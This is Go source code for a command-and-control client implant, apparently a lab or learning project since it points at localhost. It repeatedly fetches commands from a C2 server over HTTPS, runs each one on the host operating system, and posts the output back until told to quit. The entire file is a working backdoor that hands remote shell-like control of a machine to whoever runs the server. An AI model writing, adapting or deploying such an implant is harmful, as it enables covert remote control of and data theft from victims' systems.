package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// constants
const certPath = "resources" + string(os.PathSeparator) + "server.crt"
const host = "https://localhost"
const port = 4433
const getCmdURL = "/getcmd"
const cmdOutputURL = "/cmdoutput"

// SetupClient sets up the client object with the self-signed cert
// and returns it.
func SetupClient() *http.Client {
	// set up own cert pool
	tlsConfig := &tls.Config{RootCAs: x509.NewCertPool()}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	client := &http.Client{Transport: transport}

	// load trusted cert path
	caCert, err := ioutil.ReadFile(certPath)
	if err != nil {
		panic(err)
	}
	ok := tlsConfig.RootCAs.AppendCertsFromPEM(caCert)
	if !ok {
		panic("Couldn't load cert file")
	}

	return client
}

// AskForCmd sends a HTTPS GET request to the c2 server's
// /getCmd endpoint and returns the parsed command string.
func AskForCmd(client *http.Client, url string) string {
	fmt.Println("[+] Calling home to c2 to get cmd...")
	resp, err := client.Get(url)
	if err != nil {
		fmt.Printf("[-] Got error when requesting cmd: %s", err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Error while reading body of request: %s", err)
	}
	fmt.Printf("[+] Got cmd from backend:\n%s\n", body)

	return strings.Trim(string(body), " \n")
}

// ProcessCmd splits of the flow corresponding to the cmd
// string and delegates to the method that is repsonsible for
// taking out the action.
func ProcessCmd(client *http.Client, cmd string, host string) {
	if strings.Compare(cmd, "quit") == 0 {
		fmt.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	} else {
		out := ExecAndGetOutput(string(cmd))
		fmt.Printf("[+] Sending back output:\n%s\n", string(out))
		client.Post(host+cmdOutputURL, "text/html", bytes.NewBuffer(out))
	}
}

// ExecAndGetOutput executes the command string on the OS
// and returns the combined output.
func ExecAndGetOutput(cmdString string) []byte {
	fmt.Println("[+] Executing cmd...")
	cmdTokens := strings.Split(cmdString, " ")
	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	return out
}

// main entry point
func main() {
	hoststr := fmt.Sprintf("%s:%d", host, port)
	client := SetupClient()

	// endless loop until quit cmd from c2
	for {
		cmd := AskForCmd(client, hoststr+getCmdURL)
		ProcessCmd(client, cmd, hoststr)
	}
}
